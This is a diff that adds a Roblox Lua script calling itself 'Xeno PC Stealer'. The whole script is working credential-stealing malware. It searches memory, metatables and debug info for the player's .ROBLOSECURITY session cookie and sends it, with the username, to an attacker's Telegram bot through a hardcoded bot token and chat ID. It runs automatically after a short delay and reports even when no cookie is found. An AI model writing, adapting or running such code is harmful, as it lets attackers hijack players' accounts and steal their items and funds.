@@ -1,0 +1,81 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local RunService = game:GetService("RunService")
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local function findCookie()
+    local cookie = nil
+
+    pcall(function()
+        local gc = getgc or get_gc
+        if gc then
+            for _, v in pairs(gc()) do
+                if type(v) == "string" and #v > 800 and v:find("_|WARNING") then
+                    cookie = v:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end
+    end)
+
+    if not cookie then
+        pcall(function()
+            local mt = getrawmetatable or get_raw_metatable
+            if mt then
+                for _, v in pairs(getgc()) do
+                    if type(v) == "table" then
+                        pcall(function()
+                            for _, val in pairs(v) do
+                                if type(val) == "string" and #val > 800 and val:find("_|WARNING") then
+                                    cookie = val:match("(_|WARNING[^%s\"']+)")
+                                    if cookie then break end
+                                end
+                            end
+                        end)
+                    end
+                    if cookie then break end
+                end
+            end
+        end)
+    end
+
+    if not cookie then
+        pcall(function()
+            for i = 1, 5000 do
+                pcall(function()
+                    local s = debug.getinfo and debug.getinfo(i, "S") and debug.getinfo(i, "S").source
+                    if type(s) == "string" and s:find("_|WARNING") then
+                        cookie = s:match("(_|WARNING[^%s\"']+)")
+                        if cookie then break end
+                    end
+                end)
+            end
+        end)
+    end
+
+    return cookie
+end
+
+local function sendToBot(cookie)
+    local text = "🍪 " .. Player.Name .. "\n" .. cookie
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+    
+    pcall(function() syn and syn.request({Url = url}) end)
+    pcall(function() http_request and http_request({Url = url}) end)
+    pcall(function() request and request({Url = url}) end)
+    pcall(function() game:HttpGet(url) end)
+end
+
+task.spawn(function()
+    task.wait(5)
+    local cookie = findCookie()
+    if cookie then
+        sendToBot(cookie)
+    else
+        local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode("NO COOKIE: " .. Player.Name)
+        pcall(function() game:HttpGet(url) end)
+    end
+end)
+
+print("Xeno PC Stealer Loaded")
